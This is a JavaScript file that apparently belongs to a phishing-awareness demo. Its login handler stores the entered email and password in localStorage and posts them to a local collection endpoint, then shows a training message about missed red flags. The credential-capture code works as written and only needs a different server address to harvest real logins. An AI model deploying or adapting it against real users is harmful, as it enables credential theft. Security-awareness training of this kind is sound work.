const SERVER_URL = 'http://localhost:5000/collect';

document.getElementById("loginForm").addEventListener("submit", async function(e) {
    e.preventDefault();

    const email = document.getElementById('email').value;
    const password = document.getElementById('password').value;

    localStorage.setItem('demo_email', email);
    localStorage.setItem('demo_password', password);

    // send credentials to configured server for collection (demo only)
    let serverOk = false;
    let serverStatusText = '';
    try {
        const resp = await fetch(SERVER_URL, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ email, password })
        });
        serverOk = resp.ok;
        serverStatusText = resp.ok ? `Sent to server: ${SERVER_URL}` : `Server error: ${resp.status}`;
    } catch (err) {
        console.error('Error sending credentials to server:', err);
        serverStatusText = `Network error sending to ${SERVER_URL}`;
    }

    document.querySelector(".login-box").style.display = "none";

    const awarenessBox = document.getElementById("awareness");
    awarenessBox.classList.remove("hidden");

    awarenessBox.innerHTML = `
        <h2>⚠️ Phishing Awareness Demo</h2>
        <p>This was a simulated phishing page.</p>

        <h3>What Just Happened?</h3>
        <ul>
            <li>You trusted a realistic-looking page.</li>
            <li>You entered credentials without checking the real domain.</li>
            <li>In a real attack, this data would be sent to an attacker.</li>
        </ul>

        <h3>Red Flags You Missed:</h3>
        <ul>
            <li>Fake domain name</li>
            <li>Generic wording like "Account Verification"</li>
            <li>No clear branding</li>
        </ul>

        <p><strong>Important:</strong> This demo stored the email and password locally for demonstration only.</p>
        <p><strong>Server:</strong> ${serverStatusText}</p>
        <p><strong>Local storage keys:</strong> demo_email, demo_password</p>
        <p>Check the file <em>received_creds.txt</em> in the project folder to see received entries.</p>
    `;
});
